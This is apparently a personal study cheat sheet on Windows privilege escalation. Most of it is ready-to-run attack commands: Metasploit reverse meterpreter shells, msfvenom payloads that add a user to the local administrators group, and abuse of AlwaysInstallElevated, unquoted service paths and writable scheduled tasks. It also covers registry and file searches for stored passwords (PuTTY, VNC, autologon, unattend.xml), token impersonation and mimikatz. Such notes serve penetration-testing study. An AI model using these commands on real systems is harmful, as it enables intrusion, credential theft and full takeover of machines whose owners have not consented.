<h1>Windows Priv esc learning</h1>
First run whoami /priv to see account privilages or gpresult /v <br>
Check privilges against exploits listed here -- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges <br>

<h2> JuicyPotato </h2> <br>
If a user has SEImpersonate privilage or SeAssignPrimaryToken can try priv esc with juicy potato (usually service accounts have this set). <br>
Can use Windowsexploitsuggestor.py, copy systeminfo output from a machine (type systeminfo on cmd) then paste into python windows exploit suggestor (doesnt work on my machine). <br>
<br>
To get exploit onto machine, open a web delivery meterpreter shell via MSFCONSOLE -- type exploit /multi/script/web_delivery. Change payload to meterpreter reverse_tcp. Set lhost and all that lovely stuff and change exploit target to powershell (if on windows). This will now give reverse shell output to run on the comprimised machine. Paste onto comprimised machine. <br>
Back on msfconsole type -- sessions 1 <br>
Could now type -- run /post/multi/recon/local_exploit_suggestor, use exploits suggested. 

<h2>pre requists </h2>

<h3>If on a box check perms and check other users</h3>
whoami /priv
whoami /groups
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

<h3>List shares</h3>
net share
powershell Find-DomainShare -ComputerDomain domain.local

<h3>Find passwords</h3>
cmdkey /list (need to the use windows tool - runas.exe google the syntax to see how to run this.<br>
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

<h3>Find certain files</h3>
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini


<h3>Search the registry for key names and passwords</h3>
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

<h3>Passwords in unattend.xml</h3>
Location of the unattend.xml files.

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

<h2> default writeable shares </h2>
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp

<h2>Autoruns</h2>
run ---- either of the below
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

can get a tool called autoruns - will show programs that automatically run which if writeable can create reverse shell
from msfconsole and replace program


<h2>Checking install elevated </h2>
Type - reg query HKLM\Software\Policies\Microsoft\Windows\Installer (this is a direct policy path it can change
per software)
notice that “AlwaysInstallElevated” value is 1.
Geberate reverse shell exe with msfvenom and setup a listener
msiexec /quiet /qn /i /pathtosoftwarecreated

<h2>unquoted service paths</h2>
Run winpeas and check for any unquoted service paths <br>
if winpeas wont work try run <br>
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ <br>
for example if path -- C:\Program Files\unquoted path\Common Files <br>
create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe <br>
place in C:\Program Files\unquoted path (this ovbiously changes path for what you found) <br>
call service   -- sc start servicename <br>
you change change whats in the generated exe  <br>


<h2>search configuration files for passwords</h2>
<br>
<h2> RunAs </h2> <br>
If you have a meterpreter shell, try the command getsystem <br>


<h2>kernel exploits</h2>
if established session with MSFCONSOLE while sessions is established type
run post/multi/recon/local_exploit_suggester
identify vulnerability and type
use exploitname
set SESSION [meterpreter SESSION number]
set LPORT
run

<h2> Scheduled Tasks</h2>
View tasks --- schtasks /query /fo LIST /v 
tasklist /v /fi "username eq system"

AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify the script
download here ---- https://github.com/ankh2054/windows-pentest
bypass EULA -- .\accesschk.exe /accepteula -quvw userofscheduledtaskcheckingpermission C:\Users\Administrator\Desktop\taskfilelocation
e.g --- .\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
create msfvenom shell and transfer over to victim machine
echo path_to_shell >> path_to_scheduled_script
setup listener <br>
<br>
<h2>Further processes to check </h2> <br>
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
<br>
<h2>tokens</h2>
If you have an account that can login via ssh or psexec, or can get a meterpreter shell (use payload meterpreter), if a DA has had a session on the machine, type when in  meterpreter shell list_tokens, see if admin token is listed. If so type impersonate_token domain\\username, now run "shell" to drop into shell. <br> If account has domain privilages run mimikatz to dump, look in AD section.
